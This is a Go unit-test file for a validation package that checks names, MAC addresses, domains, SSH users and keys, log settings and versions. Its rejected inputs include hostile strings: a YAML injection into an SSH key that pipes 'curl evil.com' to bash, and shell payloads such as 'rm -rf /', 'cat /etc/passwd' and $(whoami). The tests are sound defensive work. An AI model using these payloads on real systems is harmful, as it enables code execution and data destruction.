package validation

import (
	"strings"
	"testing"
)

func TestValidateInstanceName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid names
		{"simple", "dev", false},
		{"with-hyphen", "my-instance", false},
		{"with-underscore", "my_instance", false},
		{"with-numbers", "dev123", false},
		{"mixed", "my-dev_123", false},
		{"uppercase", "MyDev", false},
		{"single-char", "a", false},
		{"max-length", "a12345678901234567890123456789012345678901234567890123456789012", false}, // 63 chars

		// Invalid names
		{"empty", "", true},
		{"starts-with-number", "123dev", true},
		{"starts-with-hyphen", "-dev", true},
		{"starts-with-underscore", "_dev", true},
		{"contains-space", "my dev", true},
		{"contains-dot", "my.dev", true},
		{"contains-slash", "my/dev", true},
		{"contains-backslash", "my\\dev", true},
		{"path-traversal", "../etc", true},
		{"xml-injection", "test<script>", true},
		{"quote", "test'quote", true},
		{"too-long", "a1234567890123456789012345678901234567890123456789012345678901234", true}, // 64 chars
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateInstanceName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateMACAddress(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid MACs
		{"lowercase", "52:54:00:ab:cd:ef", false},
		{"uppercase", "52:54:00:AB:CD:EF", false},
		{"mixed-case", "52:54:00:Ab:Cd:Ef", false},
		{"all-zeros", "00:00:00:00:00:00", false},
		{"all-ff", "ff:ff:ff:ff:ff:ff", false},

		// Invalid MACs
		{"empty", "", true},
		{"too-short", "52:54:00:ab:cd", true},
		{"too-long", "52:54:00:ab:cd:ef:00", true},
		{"missing-colon", "525400abcdef", true},
		{"with-hyphen", "52-54-00-ab-cd-ef", true},
		{"invalid-char", "52:54:00:ab:cd:gg", true},
		{"xml-injection", "52:54:00'/>", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateMACAddress(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateMACAddress(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceName_Valid(t *testing.T) {
	if err := ValidateInstanceName("dev"); err != nil {
		t.Errorf("ValidateInstanceName(\"dev\") should be valid, got: %v", err)
	}
}

func TestValidateInstanceName_Invalid(t *testing.T) {
	if err := ValidateInstanceName("../etc"); err == nil {
		t.Error("ValidateInstanceName(\"../etc\") should be invalid")
	}
}

func TestValidateMACAddress_Valid(t *testing.T) {
	if err := ValidateMACAddress("52:54:00:ab:cd:ef"); err != nil {
		t.Errorf("ValidateMACAddress(\"52:54:00:ab:cd:ef\") should be valid, got: %v", err)
	}
}

func TestValidateMACAddress_Invalid(t *testing.T) {
	if err := ValidateMACAddress("invalid"); err == nil {
		t.Error("ValidateMACAddress(\"invalid\") should be invalid")
	}
}

func TestValidateSnapshotName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid names
		{"simple", "snap1", false},
		{"with-hyphen", "snap-1", false},
		{"with-underscore", "snap_1", false},
		{"mixed", "Snap-123_test", false},
		{"starts-digit", "1snap", false},
		{"all-digits", "123", false},

		// Invalid names
		{"empty", "", true},
		{"starts-hyphen", "-snap", true},
		{"starts-underscore", "_snap", true},
		{"contains-space", "snap 1", true},
		{"contains-dot", "snap.1", true},
		{"special-chars", "snap@1", true},
		{"too-long", strings.Repeat("a", 256), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSnapshotName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSnapshotName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateDomain(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid domains
		{"simple", "github.com", false},
		{"subdomain", "api.github.com", false},
		{"deep-subdomain", "a.b.c.d.example.com", false},
		{"with-numbers", "github123.com", false},
		{"hyphenated-label", "my-site.com", false},
		{"single-label", "localhost", false},
		{"with-trailing-dot", "github.com.", false},
		{"wildcard", "*.github.com", false},
		{"wildcard-subdomain", "*.api.github.com", false},
		{"uppercase", "GITHUB.COM", false},
		{"mixed-case", "GitHub.Com", false},
		{"max-label-length", "a" + strings.Repeat("b", 62) + ".com", false}, // 63 char label

		// Invalid domains
		{"empty", "", true},
		{"control-char-newline", "github.com\n", true},
		{"control-char-tab", "github.com\t", true},
		{"control-char-null", "github\x00.com", true},
		{"control-char-bell", "github\x07.com", true},
		{"just-wildcard", "*.", true},
		{"empty-after-wildcard", "*.", true},
		{"consecutive-dots", "github..com", true},
		{"starts-with-dot", ".github.com", true},
		{"label-starts-with-hyphen", "-github.com", true},
		{"label-ends-with-hyphen", "github-.com", true},
		{"label-too-long", "a" + strings.Repeat("b", 63) + ".com", true}, // 64 char label
		{"too-long", strings.Repeat("a", 254), true},                     // > 253 chars
		{"special-chars", "github@.com", true},
		{"underscore-in-label", "git_hub.com", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDomain(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDomain(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateSSHUser(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid usernames
		{"simple", "ubuntu", false},
		{"with-hyphen", "my-user", false},
		{"with-underscore", "my_user", false},
		{"with-numbers", "user123", false},
		{"mixed", "my_user-123", false},
		{"starts-underscore", "_user", false},
		{"uppercase", "MyUser", false},
		{"single-char", "a", false},
		{"max-length", "a1234567890123456789012345678901", false}, // 32 chars

		// Invalid usernames
		{"empty", "", true},
		{"starts-with-number", "123user", true},
		{"starts-with-hyphen", "-user", true},
		{"contains-space", "my user", true},
		{"contains-dot", "my.user", true},
		{"contains-slash", "my/user", true},
		{"contains-backslash", "my\\user", true},
		{"path-traversal", "../etc", true},
		{"shell-injection", "user$(whoami)", true},
		{"shell-injection-backtick", "user`id`", true},
		{"quote-single", "user'quote", true},
		{"quote-double", "user\"quote", true},
		{"semicolon", "user;id", true},
		{"pipe", "user|id", true},
		{"ampersand", "user&id", true},
		{"newline", "user\nid", true},
		{"too-long", "a12345678901234567890123456789012", true}, // 33 chars
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSSHUser(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSSHUser(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateResourceLimits(t *testing.T) {
	tests := []struct {
		name     string
		cpus     int
		memoryMB int
		wantErr  bool
	}{
		// Valid limits
		{"min-values", 1, 256, false},
		{"typical-dev", 2, 4096, false},
		{"max-cpus", 128, 4096, false},
		{"max-memory", 2, 262144, false},
		{"max-both", 128, 262144, false},

		// Invalid limits
		{"zero-cpus", 0, 4096, true},
		{"negative-cpus", -1, 4096, true},
		{"too-many-cpus", 129, 4096, true},
		{"zero-memory", 2, 0, true},
		{"memory-too-low", 2, 255, true},
		{"memory-too-high", 2, 262145, true},
		{"both-invalid", 0, 0, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateResourceLimits(tt.cpus, tt.memoryMB)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateResourceLimits(%d, %d) error = %v, wantErr %v", tt.cpus, tt.memoryMB, err, tt.wantErr)
			}
		})
	}
}

func TestValidateDiskSize(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid sizes
		{"min-size", "1G", false},
		{"typical-size", "20G", false},
		{"large-size", "100G", false},
		{"max-gigabytes", "10240G", false},
		{"terabyte", "1T", false},
		{"max-terabytes", "10T", false},

		// Invalid sizes
		{"empty", "", true},
		{"single-char", "G", true},
		{"no-unit", "20", true},
		{"kilobytes", "1K", true},
		{"megabytes", "100M", true},
		{"zero", "0G", true},
		{"negative-notation", "-5G", true},
		{"too-large-T", "11T", true},
		{"too-large-G", "10241G", true},
		{"invalid-unit", "20X", true},
		{"float", "2.5G", true},
		{"spaces", "20 G", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDiskSize(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDiskSize(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestNormalizeUpstreamDNS_Validation(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid upstreams
		{"ipv4-with-port", "8.8.8.8:53", false},
		{"ipv4-no-port", "8.8.8.8", false},
		{"ipv4-alt-port", "1.1.1.1:5353", false},
		{"hostname-with-port", "dns.example.com:53", false},
		{"hostname-no-port", "dns.example.com", false},
		{"localhost", "localhost", false},
		{"localhost-with-port", "localhost:5353", false},

		// Invalid upstreams
		{"empty", "", true},
		{"port-only", ":53", true},
		{"port-zero", "8.8.8.8:0", true},
		{"port-too-high", "8.8.8.8:65536", true},
		{"invalid-port", "8.8.8.8:abc", true},
		{"spaces", "8.8.8.8 :53", true},
		{"ipv6", "[::1]:53", true}, // Currently not supported
		{"invalid-ip-999", "999.999.999.999", true},
		{"invalid-ip-256", "256.256.256.256", true},
		{"invalid-ip-999-port", "999.999.999.999:53", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := NormalizeUpstreamDNS(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("NormalizeUpstreamDNS(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestNormalizeUpstreamDNS(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		wantResult string
		wantErr    bool
	}{
		// Valid upstreams with normalization
		{"ipv4-with-port", "8.8.8.8:53", "8.8.8.8:53", false},
		{"ipv4-no-port-adds-53", "8.8.8.8", "8.8.8.8:53", false},
		{"ipv4-alt-port", "1.1.1.1:5353", "1.1.1.1:5353", false},
		{"hostname-with-port", "dns.example.com:53", "dns.example.com:53", false},
		{"hostname-no-port-adds-53", "dns.example.com", "dns.example.com:53", false},
		{"localhost-adds-53", "localhost", "localhost:53", false},
		{"localhost-with-port", "localhost:5353", "localhost:5353", false},

		// Invalid upstreams
		{"empty", "", "", true},
		{"port-only", ":53", "", true},
		{"port-zero", "8.8.8.8:0", "", true},
		{"port-too-high", "8.8.8.8:65536", "", true},
		{"invalid-port", "8.8.8.8:abc", "", true},
		{"invalid-ip-999", "999.999.999.999", "", true},
		{"invalid-ip-256", "256.256.256.256", "", true},
		{"invalid-host-char", "bad@host:53", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := NormalizeUpstreamDNS(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("NormalizeUpstreamDNS(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
			if !tt.wantErr && result != tt.wantResult {
				t.Errorf("NormalizeUpstreamDNS(%q) = %q, want %q", tt.input, result, tt.wantResult)
			}
		})
	}
}

func TestValidateSSHPublicKey(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid SSH public keys
		{"ed25519", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@host", false},
		{"ed25519-no-comment", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl", false},
		{"rsa", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDRGNp user@host", false},
		{"ecdsa-256", "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTY= user@host", false},
		{"ecdsa-384", "ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQ= user@host", false},
		{"ecdsa-521", "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjE= user@host", false},
		{"sk-ed25519", "sk-ssh-ed25519@openssh.com AAAAG3NrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29t= user@host", false},
		{"sk-ecdsa", "sk-ecdsa-sha2-nistp256@openssh.com AAAAI3NrLWVjZHNhLXNoYTItbmlzdHAyNTZAb3BlbnNzaC5jb20= user@host", false},
		{"dss", "ssh-dss AAAAB3NzaC1kc3MAAACBALsF8= user@host", false},
		{"comment-with-spaces", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl my key with spaces", false},
		{"comment-with-email", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@example.com", false},

		// Invalid SSH public keys - YAML injection attempts
		{"empty", "", true},
		{"newline-injection", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n  - curl evil.com | bash", true},
		{"yaml-multiline", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl |\n  runcmd:\n  - curl evil.com", true},
		{"control-char-tab", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\tmalicious", true},
		{"control-char-null", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\x00malicious", true},
		{"control-char-bell", "ssh-ed25519 \x07AAAAC3NzaC1lZDI1NTE5AAAAI", true},

		// Invalid SSH public keys - format errors
		{"unknown-type", "ssh-unknown AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl", true},
		{"no-key-data", "ssh-ed25519 ", true},
		{"invalid-base64", "ssh-ed25519 !!!invalid!!!", true},
		{"just-type", "ssh-ed25519", true},
		{"extra-spaces", "ssh-ed25519  AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl", true},
		{"leading-space", " ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl", true},
		{"random-text", "not a valid key at all", true},
		{"too-long", "ssh-ed25519 " + strings.Repeat("A", 8200), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSSHPublicKey(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSSHPublicKey(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogLevel(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid log levels
		{"empty", "", false},
		{"debug", "debug", false},
		{"info", "info", false},
		{"warn", "warn", false},
		{"warning", "warning", false},
		{"error", "error", false},
		{"debug-uppercase", "DEBUG", false},
		{"info-uppercase", "INFO", false},
		{"warn-uppercase", "WARN", false},
		{"warning-uppercase", "WARNING", false},
		{"error-uppercase", "ERROR", false},
		{"debug-mixed", "Debug", false},
		{"info-mixed", "Info", false},

		// Invalid log levels
		{"trace", "trace", true},
		{"fatal", "fatal", true},
		{"verbose", "verbose", true},
		{"quiet", "quiet", true},
		{"random", "notavalidlevel", true},

		// Security: ensure flag-like values are rejected
		{"flag-help", "--help", true},
		{"flag-version", "--version", true},
		{"flag-config", "--config=/etc/passwd", true},
		{"semicolon-injection", "info; rm -rf /", true},
		{"pipe-injection", "info | cat /etc/passwd", true},
		{"newline-injection", "info\nmalicious", true},
		{"null-injection", "info\x00malicious", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogLevel(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogLevel(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogFormat(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid log formats
		{"empty", "", false},
		{"text", "text", false},
		{"json", "json", false},
		{"text-uppercase", "TEXT", false},
		{"json-uppercase", "JSON", false},
		{"text-mixed", "Text", false},
		{"json-mixed", "Json", false},

		// Invalid log formats
		{"xml", "xml", true},
		{"yaml", "yaml", true},
		{"random", "notavalidformat", true},

		// Security: ensure flag-like values are rejected
		{"flag-help", "--help", true},
		{"flag-version", "--version", true},
		{"semicolon-injection", "json; rm -rf /", true},
		{"pipe-injection", "json | cat /etc/passwd", true},
		{"newline-injection", "json\nmalicious", true},
		{"null-injection", "json\x00malicious", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogFormat(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogFormat(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateIPv4(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid loopback", "127.0.0.1", false},
		{"valid private", "10.10.10.1", false},
		{"valid public", "8.8.8.8", false},
		{"valid max octets", "255.255.255.255", false},
		{"empty", "", true},
		{"not an IP", "not-an-ip", true},
		{"ipv6", "::1", true},
		{"ipv6 full", "2001:db8::1", true},
		{"out of range", "256.256.256.256", true},
		{"incomplete", "10.10.10", true},
		{"extra octets", "10.10.10.1.1", true},
		{"with port", "10.10.10.1:8080", true},
		{"injection", "10.10.10.1; whoami", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateIPv4(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateIPv4(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateYAMLSafeString(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"empty", "", false},
		{"simple", "hello", false},
		{"with spaces", "hello world", false},
		{"control char", "hello\nworld", true},
		{"colon", "key:value", true},
		{"hash", "comment#here", true},
		{"ampersand", "a&b", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateYAMLSafeString(tt.input, "test")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateYAMLSafeString(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateTetragonVersion(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "v1.0.0", false},
		{"valid with suffix", "v1.0.0-rc1", false},
		{"valid with dotted suffix", "v1.3.0-rc.1", false},
		{"valid alpha", "v1.2.3-alpha", false},
		{"empty", "", false},
		{"injection semicolon", "v1.0.0; whoami", true},
		{"injection backtick", "v1.0.0`whoami`", true},
		{"path traversal", "v1.0.0/../../etc", true},
		{"missing v", "1.0.0", true},
		{"missing patch", "v1.0", true},
		{"newline injection", "v1.0.0\nmalicious", true},
		{"dollar injection", "v1.0.0$(id)", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateTetragonVersion(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateTetragonVersion(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

// testCACert is a valid self-signed PEM certificate for testing purposes.
const testCACert = `-----BEGIN CERTIFICATE-----
MIIBfTCCASOgAwIBAgIUdGVzdC1jZXJ0aWZpY2F0ZS0xMjMwCgYIKoZIzj0EAwIw
FzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMB4XDTI0MDEwMTAwMDAwMFoXDTM0MDEw
MTAwMDAwMFowFzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMFkwEwYHKoZIzj0CAQYI
KoZIzj0DAQcDQgAEMIIBfTCCASOgAwIBAgIUdGVzdC1jZXJ0aWZpY2F0ZS0xMjMw
CgYIKoZIzj0EAwIwFzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMAoGCCqGSM49BAMC
AzAAMC0CFQCtest1MBMGA1UEAwwMYWJveC10ZXN0LWNBMA==
-----END CERTIFICATE-----`

func TestValidatePEMCertificate(t *testing.T) {
	tests := []struct {
		name    string
		cert    string
		wantErr bool
	}{
		{"valid", testCACert, false},
		{"empty", "", true},
		{"not PEM", "not a certificate", true},
		{"wrong type", "-----BEGIN PRIVATE KEY-----\nMIIBfTCCASOg\n-----END PRIVATE KEY-----", true},
		{"chain valid", testCACert + "\n" + testCACert, false},
		{"trailing garbage", testCACert + "\ngarbage", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePEMCertificate(tt.cert)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePEMCertificate() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
